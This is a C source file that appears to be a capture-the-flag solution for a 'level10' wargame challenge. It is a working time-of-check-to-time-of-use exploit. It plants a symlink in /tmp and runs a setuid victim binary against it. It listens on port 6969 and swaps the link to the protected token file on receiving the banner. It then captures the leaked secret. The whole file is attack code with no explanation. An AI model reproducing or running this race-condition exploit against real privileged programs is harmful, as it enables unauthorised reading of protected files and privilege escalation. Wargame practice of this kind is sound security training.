#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define PORT 6969
#define BUFSIZE 4096

char buffer[BUFSIZ];


void Spawn_files()
{
    unlink("/tmp/link");
    unlink("/tmp/dummy");

    remove("/tmp/dummy");
    remove("/tmp/link");
    printf("\n[*] Cleaning Files ... \n");

    system("echo DUMMY > /tmp/dummy");
    chmod("/tmp/dummy", 0777);

    symlink("/tmp/dummy", "/tmp/link");
    printf("[+] New Files Created!\n");
}

void    swap()
{
    unlink("/tmp/link");
    symlink("/home/user/level10/token", "/tmp/link");
    printf("[+] Files Swaped\n");    
}

void    run_victim()
{
    execl("/home/user/level10/level10", "/home/user/level10/level10", "/tmp/link", "127.0.0.1", NULL);
    perror("execl");
    exit(1);
}
int main() {
    
    int sockfd, connfd;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);

    Spawn_files();
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }

    listen(sockfd, 1);
    printf("[*] Listening on port %d...\n", PORT);

    pid_t pid = fork();
    if (pid == 0 )
    {
        run_victim();
    }
    connfd = accept(sockfd, (struct sockaddr*)&addr, &addrlen);
    if (connfd < 0) {
        perror("accept");
        exit(1);
    }
    
    

    int n = recv(connfd, buffer, 8, 0);
    buffer[n] = '\0';
    
    printf("\n[+] Banner Recieved %s", buffer);
    swap();
    sleep(1);

    n = recv(connfd, buffer,BUFSIZ - 1, 0);
    buffer[n] = '\0';
    
    printf("PASS : %s \n", buffer);

    close(connfd);
    close(sockfd);
    wait(NULL);  
    return 0;
}

